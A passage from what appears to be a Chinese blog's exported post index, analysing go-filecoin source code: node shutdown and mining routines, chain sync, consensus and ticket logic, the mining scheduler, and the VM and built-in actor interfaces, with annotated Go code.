&quot;processMessage&quot;, node.MessageSub, &quot;MessageSub&quot;) // 启用新线程处理新的tipset事件 node.HeaviestTipSetHandled = func() &#123;&#125; node.HeaviestTipSetCh = node.ChainReader.HeadEvents().Sub(chain.NewHeadTopic) go node.handleNewHeaviestTipSet(cctx, node.ChainReader.Head()) // 非离线模式启动bootstapper服务 if !node.OfflineMode &#123; node.Bootstrapper.Start(context.Background()) &#125; // 启动心跳服务 if err := node.setupHeartbeatServices(ctx); err != nil &#123; return errors.Wrap(err, &quot;failed to start heartbeat services&quot;) &#125; return nil&#125; 停止filecoin节点的流程概览 释放资源，停止相关服务 12345678910111213141516171819202122232425262728293031323334// Stop initiates the shutdown of the node.func (node *Node) Stop(ctx context.Context) &#123; node.ChainReader.HeadEvents().Unsub(node.HeaviestTipSetCh) // 停止挖矿 node.StopMining(ctx) // 取消订阅 node.cancelSubscriptions() // 停止链读取服务 node.ChainReader.Stop() // 停止密封服务 if node.SectorBuilder() != nil &#123; if err := node.SectorBuilder().Close(); err != nil &#123; fmt.Printf(&quot;error closing sector builder: %s\n&quot;, err) &#125; node.sectorBuilder = nil &#125; // 关闭host实例 if err := node.Host().Close(); err != nil &#123; fmt.Printf(&quot;error closing host: %s\n&quot;, err) &#125; // 关闭资源实例 if err := node.Repo.Close(); err != nil &#123; fmt.Printf(&quot;error closing repo: %s\n&quot;, err) &#125; // 关闭bootstqpper实例 node.Bootstrapper.Stop() fmt.Println(&quot;stopping filecoin :(&quot;)&#125; 启动及停止挖矿 启动挖矿 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160// StartMining causes the node to start feeding blocks to the mining worker and initializes// the SectorBuilder for the mining address.func (node *Node) StartMining(ctx context.Context) error &#123; // 如果在挖矿中，退出 if node.isMining() &#123; return errors.New(&quot;Node is already mining&quot;) &#125; // 获取矿工地址 minerAddr, err := node.miningAddress() if err != nil &#123; return errors.Wrap(err, &quot;failed to get mining address&quot;) &#125; // 确保密封服务实例存在 // ensure we have a sector builder if node.SectorBuilder() == nil &#123; if err := node.setupMining(ctx); err != nil &#123; return err &#125; &#125; // 获取地址 minerOwnerAddr, err := node.miningOwnerAddress(ctx, minerAddr) minerSigningAddress := node.MiningSignerAddress() if err != nil &#123; return errors.Wrapf(err, &quot;failed to get mining owner address for miner %s&quot;, minerAddr) &#125; blockTime, mineDelay := node.MiningTimes() // 实例化挖矿调度服务 if node.MiningScheduler == nil &#123; getStateFromKey := func(ctx context.Context, tsKey string) (state.Tree, error) &#123; tsas, err := node.ChainReader.GetTipSetAndState(ctx, tsKey) if err != nil &#123; return nil, err &#125; return state.LoadStateTree(ctx, node.CborStore(), tsas.TipSetStateRoot, builtin.Actors) &#125; getState := func(ctx context.Context, ts types.TipSet) (state.Tree, error) &#123; return getStateFromKey(ctx, ts.String()) &#125; getWeight := func(ctx context.Context, ts types.TipSet) (uint64, error) &#123; parent, err := ts.Parents() if err != nil &#123; return uint64(0), err &#125; // TODO handle genesis cid more gracefully if parent.Len() == 0 &#123; return node.Consensus.Weight(ctx, ts, nil) &#125; pSt, err := getStateFromKey(ctx, parent.String()) if err != nil &#123; return uint64(0), err &#125; return node.Consensus.Weight(ctx, ts, pSt) &#125; getAncestors := func(ctx context.Context, ts types.TipSet, newBlockHeight *types.BlockHeight) ([]types.TipSet, error) &#123; return chain.GetRecentAncestors(ctx, ts, node.ChainReader, newBlockHeight, consensus.AncestorRoundsNeeded, consensus.LookBackParameter) &#125; processor := consensus.NewDefaultProcessor() worker := mining.NewDefaultWorker(node.MsgPool, getState, getWeight, getAncestors, processor, node.PowerTable, node.Blockstore, node.CborStore(), minerAddr, minerOwnerAddr, minerSigningAddress, node.Wallet, blockTime) node.MiningScheduler = mining.NewScheduler(worker, mineDelay, node.ChainReader.Head) &#125; // paranoid check // 启动挖矿服务 if !node.MiningScheduler.IsStarted() &#123; node.miningCtx, node.cancelMining = context.WithCancel(context.Background()) outCh, doneWg := node.MiningScheduler.Start(node.miningCtx) node.miningDoneWg = doneWg node.AddNewlyMinedBlock = node.addNewlyMinedBlock node.miningDoneWg.Add(1) go node.handleNewMiningOutput(outCh) &#125; // initialize a storage miner // 初始化存储矿工 storageMiner, err := initStorageMinerForNode(ctx, node) if err != nil &#123; return errors.Wrap(err, &quot;failed to initialize storage miner&quot;) &#125; node.StorageMiner = storageMiner // loop, turning sealing-results into commitSector messages to be included // in the chain // 新开线程处理，1 密封完成处理；2 接受停止挖矿消息 go func() &#123; for &#123; select &#123; // 密封完成处理 case result := &lt;-node.SectorBuilder().SectorSealResults(): if result.SealingErr != nil &#123; log.Errorf(&quot;failed to seal sector with id %d: %s&quot;, result.SectorID, result.SealingErr.Error()) &#125; else if result.SealingResult != nil &#123; // TODO: determine these algorithmically by simulating call and querying historical prices gasPrice := types.NewGasPrice(0) gasUnits := types.NewGasUnits(300) val := result.SealingResult // This call can fail due to, e.g. nonce collisions. Our miners existence depends on this. // We should deal with this, but MessageSendWithRetry is problematic. _, err := node.PorcelainAPI.MessageSend( node.miningCtx, minerOwnerAddr, minerAddr, nil, gasPrice, gasUnits, &quot;commitSector&quot;, val.SectorID, val.CommD[:], val.CommR[:], val.CommRStar[:], val.Proof[:], ) if err != nil &#123; log.Errorf(&quot;failed to send commitSector message from %s to %s for sector with id %d: %s&quot;, minerOwnerAddr, minerAddr, val.SectorID, err) continue &#125; node.StorageMiner.OnCommitmentAddedToChain(val, nil) &#125; // 挖矿取消 case &lt;-node.miningCtx.Done(): return &#125; &#125; &#125;() // schedules sealing of staged piece-data // 定时密封阶段性的碎片数据 if node.Repo.Config().Mining.AutoSealIntervalSeconds &gt; 0 &#123; go func() &#123; for &#123; select &#123; // 取消 case &lt;-node.miningCtx.Done(): return // 定时密封 case &lt;-time.After(time.Duration(node.Repo.Config().Mining.AutoSealIntervalSeconds) * time.Second): log.Info(&quot;auto-seal has been triggered&quot;) if err := node.SectorBuilder().SealAllStagedSectors(node.miningCtx); err != nil &#123; log.Errorf(&quot;scheduler received error from node.SectorBuilder.SealAllStagedSectors (%s) - exiting&quot;, err.Error()) return &#125; &#125; &#125; &#125;() &#125; else &#123; log.Debug(&quot;auto-seal is disabled&quot;) &#125; // 设置微挖矿状态 node.setIsMining(true) return nil&#125; 停止挖矿 12345678910111213141516// StopMining stops mining on new blocks.func (node *Node) StopMining(ctx context.Context) &#123; node.setIsMining(false) // 取消挖矿 if node.cancelMining != nil &#123; node.cancelMining() &#125; // 等待执行中的挖矿任务完成后结束 if node.miningDoneWg != nil &#123; node.miningDoneWg.Wait() &#125; // TODO: stop node.StorageMiner&#125; 阶段性分析结束说明 至此笔者针对go-filecoin部分的分析快告一个小的段落了 文章因为时间的关系，书面出来只是将关键部分书面表达出来，更多的像是笔者的一个分析笔记,但是我相信对于想分析源码的朋友有一定帮助 后面会抽空补充一章总结，笔者在第4章中有提到过，薄读-&gt;厚读-&gt;再薄读,我们还需要一次薄读，来加深我们对filecoin的认识。 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析十四：filecoin源码分析之服务层链同步、共识协议及挖矿]]></title>
    <url>%2F2019%2F03%2F09%2Ffilecoin-code-analysis-14%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第十四章源码分析之服务层链同步、共识协议及挖矿。 分析基于的源码版本：go-filecoin master a0598a54(2019年3月9日) chain同步基础结构 TipIndex 定义定义了tipset的基础结构及方法 12345678910111213141516171819202122232425262728293031▼ package chain▼+TipIndex : struct [fields] -mu : sync.Mutex // 根据id来获取tipset及其状态根 -tsasByID : tsasByTipSetID // 根据父块来获取tipset及其状态根 -tsasByParentsAndHeight : map[string]tsasByTipSetID [methods] // 根据id来获取tipset及其状态根 +Get(tsKey string) : *TipSetAndState, error // 根据父块来获取tipset及其状态根 +GetByParentsAndHeight(pKey string, h uint64) : []*TipSetAndState, error // 根据Id判断是否有此tipset +Has(tsKey string) : bool // 根据父块判断是否有此tipset +HasByParentsAndHeight(pKey string, h uint64) : bool // 设置tipset和状态根 +Put(tsas *TipSetAndState) : error [functions] +NewTipIndex() : *TipIndex▼+TipSetAndState : struct [fields] // tipset +TipSet : types.TipSet // 相当于区块的root cid +TipSetStateRoot : cid.Cid 链同步 chain同步的接口定义 1234567891011location: chain/syncer.go▼ package chain▼+Syncer : interface [methods] // 处理新区块的接口定义 +HandleNewBlocks(ctx context.Context, blkCids []cid.Cid) : error 具体接口实现在location: chain/defalut_syncer.go中 特殊情况的错误 12345location: chain/reorg.go // 如果当前区块头不包含在最新的区块头之上时候，会报此错误▼ functions +IsReorg(curHead types.TipSet, newChain []types.TipSet) : bool 链存储 其中 Readstore是一个通用接口 Store的设计基本是给ChainSync使用的 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748location: chain/store.go▼ package chain▼ constants // 用于发布新的区块头的主题&quot;new-head&quot; +NewHeadTopic▼ variables // 创世块的key +GenesisKey▼+ReadStore : interface [methods] // 获取历史区块，通过channel实现 +BlockHistory(ctx context.Context, tips types.TipSet) : chan interface&#123;&#125; // 获取创世区块cid +GenesisCid() : cid.Cid // 通过cid获取具体的block +GetBlock(ctx context.Context, id cid.Cid) : *types.Block, error // 通过cid获取具体的block +GetTipSetAndState(ctx context.Context, tsKey string) : *TipSetAndState, error // 获取最新区块 +Head() : types.TipSet // 最新区块变更事件 +HeadEvents() : *pubsub.PubSub // 最新合约状态 +LatestState(ctx context.Context) : state.Tree, error // 加载chain +Load(ctx context.Context) : error // 停止 +Stop() // 这个接口只是chain同步使用▼+Store : interface [embedded] +ReadStore [methods] +GetBlocks(ctx context.Context, ids types.SortedCidSet) : []*types.Block, error +GetTipSetAndStatesByParentsAndHeight(ctx context.Context, pTsKey string, h uint64) : []*TipSetAndState, error +HasAllBlocks(ctx context.Context, cs []cid.Cid) : bool +HasBlock(ctx context.Context, c cid.Cid) : bool +HasTipSetAndState(ctx context.Context, tsKey string) : bool +HasTipSetAndStatesWithParentsAndHeight(ctx context.Context, pTsKey string, h uint64) : bool // 存储并更新最新区块信息 +PutTipSetAndState(ctx context.Context, tsas *TipSetAndState) : error +SetHead(ctx context.Context, s types.TipSet) : error consensus 主要功能 提供创建选票方法，验证中奖选票方法,确定最终的tipset 将合法的tipset消息取出，生效actor状态 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364▼ package consensus▶ imports▼ constants +ECPrM : uint64 +ECV : uint64 +LookBackParameter▼ variables +AncestorRoundsNeeded +ErrInvalidBase +ErrStateRootMismatch +ErrUnorderedTipSets -log -ticketDomain : *big.Int // Expected实现EC共识▼+Expected : struct [fields] // 全局功率表 +PwrTableView : PowerTableView -bstore : blockstore.Blockstore -cstore : *hamt.CborIpldStore -genesisCid : cid.Cid -processor : Processor -verifier : proofs.Verifier [methods] // 比较两个tipset的权重 +IsHeavier(ctx context.Context, a, b types.TipSet, aSt, bSt state.Tree) : bool, error // 建立新的tipset +NewValidTipSet(ctx context.Context, blks []*types.Block) : types.TipSet, error // 运行状态转换 // 1 新区块到来的时候出发状态转换(chain sync逻辑) // 2 进入后判断tipset的有效性，包括验证选票是否中奖 // 3 逐一执行消息，切换状态 +RunStateTransition(ctx context.Context, ts types.TipSet, ancestors []types.TipSet, pSt state.Tree) : state.Tree, error // 计算tipset权重 +Weight(ctx context.Context, ts types.TipSet, pSt state.Tree) : uint64, error -runMessages(ctx context.Context, st state.Tree, vms vm.StorageMap, ts types.TipSet, ancestors []types.TipSet) : state.Tree, error -validateBlockStructure(ctx context.Context, b *types.Block) : error -validateMining(ctx context.Context, st state.Tree, ts types.TipSet, parentTs types.TipSet) : error▼+Processor : interface // 会被RunStateTransition间接掉用,进行状态切换(生效挖矿成功的tipset消息) [methods] // 从tipset中逐一取出block处理 +ProcessBlock(ctx context.Context, st state.Tree, vms vm.StorageMap, blk *types.Block, ancestors []types.TipSet) : []*ApplicationResult, error +ProcessTipSet(ctx context.Context, st state.Tree, vms vm.StorageMap, ts types.TipSet, ancestors []types.TipSet) : *ProcessTipSetResponse, error▼ functions // 与白皮书描述一致，按照存储功率出块，用以判断是否中奖 +CompareTicketPower(ticket types.Signature, minerPower uint64, totalPower uint64) : bool // 产生随机挑战种子,针对时空证明 +CreateChallengeSeed(parents types.TipSet, nullBlkCount uint64) : proofs.PoStChallengeSeed, error // 生成选票 // 用上一个区块的时空证明+矿工地址（目前直接用的矿工地址,issue1054讨论中） 生成２５６bit哈希 +CreateTicket(proof proofs.PoStProof, minerAddr address.Address) : []byte // 判断是否中奖,调用CompareTicketPower +IsWinningTicket(ctx context.Context, bs blockstore.Blockstore, ptv PowerTableView, st state.Tree, ticket types.Signature, miner address.Address) : bool, error // 实例化Expected +NewExpected(cs *hamt.CborIpldStore, bs blockstore.Blockstore, processor Processor, pt PowerTableView, gCid cid.Cid, verifier proofs.Verifier) : Protocol -init() mining挖矿的主要逻辑 1 不能将空块最为基准块 2 基于上一个Tipset信息（如果上一个为空块，必须找到空块之前高度最高的Tipset，并记录中间空块数据）和空块数母生成合法的时空证明挑战参数 3 生成时空证明 4 时空证明成功，调用共识协议创建奖票 5 如果奖票中奖，将未打包的消息打包区块 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980location: mining/working//这里是挖矿逻辑的真正入口// Mine implements the DefaultWorkers main mining function..// The returned bool indicates if this miner created a new block or not.func (w *DefaultWorker) Mine(ctx context.Context, base types.TipSet, nullBlkCount int, outCh chan&lt;- Output) bool &#123; log.Info(&quot;Worker.Mine&quot;) ctx = log.Start(ctx, &quot;Worker.Mine&quot;) defer log.Finish(ctx) // 不能将空块作为基准块挖矿 if len(base) == 0 &#123; log.Warning(&quot;Worker.Mine returning because it can&apos;t mine on an empty tipset&quot;) outCh &lt;- Output&#123;Err: errors.New(&quot;bad input tipset with no blocks sent to Mine()&quot;)&#125; return false &#125; st, err := w.getStateTree(ctx, base) if err != nil &#123; log.Errorf(&quot;Worker.Mine couldn&apos;t get state tree for tipset: %s&quot;, err.Error()) outCh &lt;- Output&#123;Err: err&#125; return false &#125; log.Debugf(&quot;Mining on tipset: %s, with %d null blocks.&quot;, base.String(), nullBlkCount) if ctx.Err() != nil &#123; log.Warningf(&quot;Worker.Mine returning with ctx error %s&quot;, ctx.Err().Error()) return false &#125; // 基于上一个基准Tipset以及空块数目生成Post随机挑战参数 challenge, err := consensus.CreateChallengeSeed(base, uint64(nullBlkCount)) if err != nil &#123; outCh &lt;- Output&#123;Err: err&#125; return false &#125; // 生成时空证明 prCh := createProof(challenge, w.createPoSTFunc) var proof proofs.PoStProof var ticket []byte select &#123; case &lt;-ctx.Done(): log.Infof(&quot;Mining run on base %s with %d null blocks canceled.&quot;, base.String(), nullBlkCount) return false case prChRead, more := &lt;-prCh: if !more &#123; log.Errorf(&quot;Worker.Mine got zero value from channel prChRead&quot;) return false &#125; copy(proof[:], prChRead[:]) // 时空证明成功，调用共识协议创建奖票 ticket = consensus.CreateTicket(proof, w.minerAddr) &#125; // TODO: Test the interplay of isWinningTicket() and createPoSTFunc() // https://github.com/filecoin-project/go-filecoin/issues/1791 // 调用共识协议确认是否中奖 weHaveAWinner, err := consensus.IsWinningTicket(ctx, w.blockstore, w.powerTable, st, ticket, w.minerAddr) if err != nil &#123; log.Errorf(&quot;Worker.Mine couldn&apos;t compute ticket: %s&quot;, err.Error()) outCh &lt;- Output&#123;Err: err&#125; return false &#125; if weHaveAWinner &#123; // 如果中奖将打包消息，生成区块 next, err := w.Generate(ctx, base, ticket, proof, uint64(nullBlkCount)) if err == nil &#123; log.SetTag(ctx, &quot;block&quot;, next) log.Debugf(&quot;Worker.Mine generates new winning block! %s&quot;, next.Cid().String()) &#125; outCh &lt;- NewOutput(next, err) return true &#125; return false&#125; 其他细节源码简析 消息队列（交易消息集）的处理 123456789101112131415161718192021222324252627282930313233location: mining/mqueue.go▼ package mining▶ imports▼+MessageQueue : struct [fields] -senderQueues : queueHeap [methods] // 取出消息切片，即多条消息 +Drain() : []*types.SignedMessage +Empty() : bool // 从队列取出一条消息 +Pop() : *types.SignedMessage, bool [functions] // 实例化消息队列 +NewMessageQueue(msgs []*types.SignedMessage) : MessageQueue -nonceQueue : []*types.SignedMessage // 一些队列的基本操作 // 1 长度、push、pop功能 // 2 Less主要是比较两条交易中的Gas价格，大家可以回头看看type中的消息定义,这里不赘述了 // 3 为什么要提供Less接口，留给大家思索一下，熟悉[以太坊](https://learnblockchain.cn/2017/11/20/whatiseth/)的可能一眼就看出了▼-queueHeap : []nonceQueue [methods] +Len() : int +Less(i, j int) : bool +Pop() : interface&#123;&#125; +Push(x interface&#123;&#125;) +Swap(i, j int) 调度器 入口 node实例会调用NewScheduler创建相关实例并启动挖矿 1234567891011121314151617181920212223242526272829303132▼ package mining▶ imports▼ constants +MineDelayConversionFactor▼-timingScheduler : struct [fields] -isStarted : bool -mineDelay : time.Duration // 查找权重最高的Tipset -pollHeadFunc : func() types.TipSet // 底层的挖矿逻辑，在下面会分析Worker -worker : Worker [methods] // 判断是否启动挖矿 +IsStarted() : bool // 启动挖矿 +Start(miningCtx context.Context) : chan Output, *sync.WaitGroup▼+Scheduler : interface [methods] +IsStarted() : bool +Start(miningCtx context.Context) : chan Output, *sync.WaitGroup▼ functions +MineOnce(ctx context.Context, w Worker, md time.Duration, ts types.TipSet) : Output, error // 实例化timingScheduler +NewScheduler(w Worker, md time.Duration, f func() types.TipSet) : Scheduler -nextNullBlkCount(prevNullBlkCount int, prevBase, currBase types.TipSet) : int 打包区块 具体见如下注释，可对应此查阅源码。 1234567891011121314location: mining/block_generate.go▼ package mining▶ imports▼ DefaultWorker* : ctype [methods] // 1 如果节点没有产生过有效存储，无法参与挖矿 // 2 计算区块高度= 基准Tipset高度+空块数目 // 3 取出未打包消息，调用vm执行,生成收据，并更新状态 // 4 打包区块信息,返回 +Generate(ctx context.Context, baseTipSet types.TipSet, ticket types.Signature, proof proofs.PoStProof, nullBlockCount uint64) : *types.Block, error 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析十三：filecoin源码分析之服务层actor及vm]]></title>
    <url>%2F2019%2F03%2F08%2Ffilecoin-code-analysis-13%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第十三章源码分析之服务层actor及vm。 说明 分析源代码版本：master 2c87fd59（2019.3.7） 回头看第三章开发网使用中创建矿工，提交订单，支付等操作实际上都是actor的新增及状态改变 当前的实现vm还不具备通用abi数据的解释执行能力，未达到真正智能合约水平 exec(actor及vm的接口定义) 说明 提供可执行actor的最小接口要求 ExecutableActor (由actor及具体actor包实现) 提供actor键值存取接口定义 Lookup (由actor包实现) 提供状态临时存储的接口定义 Storage (由vm.Storage实现) actor的执行环境接口定义 VMContext (由vm.context实现) 具体源码注释如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283▼ package exec▶ imports▼ constants +ErrDanglingPointer +ErrDecode +ErrInsufficientGas +ErrStaleHead▼ variables +Errors▼+Error : string [methods] +Error() : string +ExportedFunc : func(ctx VMContext) []byte, uint8, error // actor符号集合▼+Exports : map[string]*FunctionSignature [methods] // 判断是否存在特定方法 +Has(method string) : bool // 对于单个函数的符号表 // todo中的事情：需要转换为非go类型▼+FunctionSignature : struct [fields] +Params : []abi.Type +Return : []abi.Type // 可执行合约接口，这是每一类型的合约必须实现的最小接口 // 包括account,miner,storagemarket,paymentbroker▼+ExecutableActor : interface [methods] +Exports() : Exports +InitializeState(storage Storage, initializerData interface&#123;&#125;) : error // 由actor.lookup实现键值存储 （actor/storage.go）▼+Lookup : interface [methods] +Commit(ctx context.Context) : cid.Cid, error +Delete(ctx context.Context, k string) : error +Find(ctx context.Context, k string) : interface&#123;&#125;, error +IsEmpty() : bool +Set(ctx context.Context, k string, v interface&#123;&#125;) : error +Values(ctx context.Context) : []*hamt.KV, error // 由vm.Storage实现 // 解决持久化的问题，有副本防止回滚机制 // 具体实现还有Flush持久化到datastore功能▼+Storage : interface [methods] // 提交最新actor Head +Commit(cid.Cid, cid.Cid) : error // 如下都为内存中操作 +Get(cid.Cid) : []byte, error +Head() : cid.Cid +Put(interface&#123;&#125;) : cid.Cid, error // actor的abi执行环境接口,由vm.context实现▼+VMContext : interface [methods] // 创建新的合约地址 +AddressForNewActor() : address.Address, error // 查询区块高度 +BlockHeight() : *types.BlockHeight // Gas收费 +Charge(cost types.GasUnits) : error // 创建合约 +CreateNewActor(addr address.Address, code cid.Cid, initalizationParams interface&#123;&#125;) : error // 判断是否为account类型的Actor +IsFromAccountActor() : bool // 合约中交易信息 +Message() : *types.Message // 执行合约函数 +Send(to address.Address, method string, value *types.AttoFIL, params []interface&#123;&#125;) : [][]byte, uint8, error +Storage() : Storage // 当Storage接口完成会删除如下两项 +ReadStorage() : []byte, error +WriteStorage(interface&#123;&#125;) : error actor的类型及源码分析 actor包定义及实现了基础actor,此外filecoin还定义了四种内置的actor类型 存储市场actor,此类actor整个网络只有一个实例，用于创建存储矿工、更新功率表、获取总存储容量 Miner actor,此类actor整个网络只有多个实例（随用户数增加而增加），用于执行矿工相关的操作 paymentbroker actor,此类actor整个网络只有一个实例，用于创建支付通道以及支付相关信息 account actor,账户actor,此类actor整个网络只有多个实例（随用户数增加而增加），只能用于基本的转账操作 ### 基础actor包 说明 定义了actor的基础结构,其中code如果使用内置的如上四种actor，他们的值都是固定的 提供了actor的基础操作方法 见笔者在代码中的注释 1234567891011121314151617181920212223242526272829303132333435363738394041424344location: actor/actor.go▼ package actor // Actor可以理解为合约或者账户，转账操作要检查code cid合法性▼+Actor : struct [fields] //余额 +Balance : *types.AttoFIL // 合约代码的cid，vm具体执行其对应的代码 // 1 具体代码的cid // 2 在go语言实现的四种特定合约，这个字段是常量，比如account,miner,storagemarket,paymentbroker +Code : cid.Cid // 合约状态的最新状态 +Head : cid.Cid // 防止重放攻击而设置的参数 +Nonce : types.Uint64 [methods] // 计算actor的cid +Cid() : cid.Cid, error // 打印合约信息 +Format(f fmt.State, c rune) // 增加Nonce+1方法 +IncNonce() // 编码 +Marshal() : []byte, error // 解码 +Unmarshal(b []byte) : error [functions] +NewActor(code cid.Cid, balance *types.AttoFIL) : *Actor▼ functions // 只有account类型的actor使用 +NextNonce(actor *Actor) : uint64, error -init() 12345678location: actor/export.go▼ functions // 返回某个actor的方法执行函数 +MakeTypedExport(actor exec.ExecutableActor, method string) : exec.ExportedFunc // 序列化成字节切片 +MarshalValue(val interface&#123;&#125;) : []byte, error storagemarket actor 主要功能 创建存储矿工 获取总存储量 更新功率 123456789101112131415161718192021222324252627282930313233343536373839▼ package storagemarket▶ imports▼ constants +ErrInsufficientCollateral +ErrPledgeTooLow +ErrUnknownMiner▼ variables +Errors +MinimumCollateralPerSector +MinimumPledge -storageMarketExports▼+Actor : struct [methods] // 创建存储矿工 // 会调用到miner actor的创建 +CreateMiner(vmctx exec.VMContext, pledge *big.Int, publicKey []byte, pid peer.ID) : address.Address, uint8, error +Exports() : exec.Exports // 获取总存储 +GetTotalStorage(vmctx exec.VMContext) : *big.Int, uint8, error +InitializeState(storage exec.Storage, _ interface&#123;&#125;) : error // 更新功率 +UpdatePower(vmctx exec.VMContext, delta *big.Int) : uint8, error▼+State : struct [fields] // miners合集的cid +Miners : cid.Cid +TotalCommittedStorage : *big.Int▼ functions +MinimumCollateral(sectors *big.Int) : *types.AttoFIL // 实例化存储市场 +NewActor() : *actor.Actor, error -init() miner actor 提供功能 有基本转账功能 提供如下功能 filecoin网络中存在多个Miner Actor 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677▼ package miner▶ imports▼ constants +ErrAskNotFound +ErrCallerUnauthorized +ErrInsufficientPledge +ErrInvalidPoSt +ErrInvalidSealProof +ErrInvalidSector +ErrPublicKeyTooBig +ErrSectorCommitted +ErrStoragemarketCallFailed +MaximumPublicKeySize▼ variables +Errors +GracePeriodBlocks +ProvingPeriodBlocks -minerExports▼+Actor : struct [fields] +Bootstrap : bool [methods] // 增加订单 +AddAsk(ctx exec.VMContext, price *types.AttoFIL, expiry *big.Int) : *big.Int, uint8, error // 抵押承诺 +CommitSector(ctx exec.VMContext, sectorID uint64, commD, commR, commRStar, proof []byte) : uint8, error +Exports() : exec.Exports // 获取存储矿工相关信息 +GetAsk(ctx exec.VMContext, askid *big.Int) : []byte, uint8, error +GetAsks(ctx exec.VMContext) : []uint64, uint8, error +GetKey(ctx exec.VMContext) : []byte, uint8, error +GetLastUsedSectorID(ctx exec.VMContext) : uint64, uint8, error +GetOwner(ctx exec.VMContext) : address.Address, uint8, error +GetPeerID(ctx exec.VMContext) : peer.ID, uint8, error +GetPledge(ctx exec.VMContext) : *big.Int, uint8, error +GetPower(ctx exec.VMContext) : *big.Int, uint8, error +GetProvingPeriodStart(ctx exec.VMContext) : *types.BlockHeight, uint8, error +GetSectorCommitments(ctx exec.VMContext) : map[string]types.Commitments, uint8, error +InitializeState(storage exec.Storage, initializerData interface&#123;&#125;) : error // 提交时空证明 +SubmitPoSt(ctx exec.VMContext, postProofs []proofs.PoStProof) : uint8, error // 更新节点Id +UpdatePeerID(ctx exec.VMContext, pid peer.ID) : uint8, error // 报价单：价格，时长，序号▼+Ask : struct [fields] +Expiry : *types.BlockHeight +ID : *big.Int +Price : *types.AttoFIL // 矿工Actor状态▼+State : struct [fields] +Asks : []*Ask +Collateral : *types.AttoFIL +LastPoSt : *types.BlockHeight +LastUsedSectorID : uint64 +NextAskID : *big.Int +Owner : address.Address +PeerID : peer.ID +PledgeSectors : *big.Int +Power : *big.Int +ProvingPeriodStart : *types.BlockHeight +PublicKey : []byte +SectorCommitments : map[string]types.Commitments [functions] +NewState(owner address.Address, key []byte, pledge *big.Int, pid peer.ID, collateral *types.AttoFIL) : *State▼ functions +NewActor() : *actor.Actor -init() paymentbroker actor 说明 全网只有一个paymentbroker 几个概念的关系简图 源码分析注释12345678910111213141516171819202122232425262728293031323334353637383940414243▼ package paymentbroker▼+Actor : struct [methods] // 关闭支付通道 +Close(vmctx exec.VMContext, payer address.Address, chid *types.ChannelID, amt *types.AttoFIL, validAt *types.BlockHeight, sig []byte) : uint8, error // 创建支付通道 +CreateChannel(vmctx exec.VMContext, target address.Address, eol *types.BlockHeight) : *types.ChannelID, uint8, error +Exports() : exec.Exports // 增加资金 +Extend(vmctx exec.VMContext, chid *types.ChannelID, eol *types.BlockHeight) : uint8, error +InitializeState(storage exec.Storage, initializerData interface&#123;&#125;) : error // 查询某个支付者的信息 +Ls(vmctx exec.VMContext, payer address.Address) : []byte, uint8, error // 撤回资金 +Reclaim(vmctx exec.VMContext, chid *types.ChannelID) : uint8, error // 赎回(或者收款)资金 +Redeem(vmctx exec.VMContext, payer address.Address, chid *types.ChannelID, amt *types.AttoFIL, validAt *types.BlockHeight, sig []byte) : uint8, error // 收据，指明在特定区块高度之前都是有效的 +Voucher(vmctx exec.VMContext, chid *types.ChannelID, amount *types.AttoFIL, validAt *types.BlockHeight) : []byte, uint8, error▼+PaymentChannel : struct [fields] // 支付通道内金额 +Amount : *types.AttoFIL // 已被赎回金额 +AmountRedeemed : *types.AttoFIL +Eol : *types.BlockHeight // 收款人地址 +Target : address.Address▼ functions // 收据的签名及校验 +SignVoucher(channelID *types.ChannelID, amount *types.AttoFIL, validAt *types.BlockHeight, addr address.Address, signer types.Signer) : types.Signature, error +VerifyVoucherSignature(payer address.Address, chid *types.ChannelID, amt *types.AttoFIL, validAt *types.BlockHeight, sig []byte) : bool -createVoucherSignatureData(channelID *types.ChannelID, amount *types.AttoFIL, validAt *types.BlockHeight) : []byte -findByChannelLookup(ctx context.Context, storage exec.Storage, byPayer exec.Lookup, payer address.Address) : exec.Lookup, error -init() -reclaim(ctx context.Context, vmctx exec.VMContext, byChannelID exec.Lookup, payer address.Address, chid *types.ChannelID, channel *PaymentChannel) : error -updateChannel(ctx exec.VMContext, target address.Address, channel *PaymentChannel, amt *types.AttoFIL, validAt *types.BlockHeight) : error -withPayerChannels(ctx context.Context, storage exec.Storage, payer address.Address, f func(exec.Lookup) error) : error -withPayerChannelsForReading(ctx context.Context, storage exec.Storage, payer address.Address, f func(exec.Lookup) error) : error account actor 说明 纯账户，记录nonce 只有转帐功能 filecoin网络中存在多个account Actor 123456789101112131415161718▼ package account▶ imports▼ variables -accountExports▼+Actor : struct [methods] +Exports() : exec.Exports +InitializeState(_ exec.Storage, _ interface&#123;&#125;) : error▼ functions // 实例化account actor 集成actor包中Actor所实现的所有方法 +NewActor(balance *types.AttoFIL) : *actor.Actor, error // 将其他actor类型转为account，保留余额 +UpgradeActor(act *actor.Actor) : error vm(虚拟机运行环境) 虚拟机执行函数 123456789101112131415▼ package vm▶ imports▼-sendDeps : struct [fields] -transfer : func(*actor.Actor, *actor.Actor, *types.AttoFIL) error▼ functions // 执行合约 +Send(ctx context.Context, vmCtx *Context) : [][]byte, uint8, error // 转账 +Transfer(fromActor, toActor *actor.Actor, value *types.AttoFIL) : error -send(ctx context.Context, deps 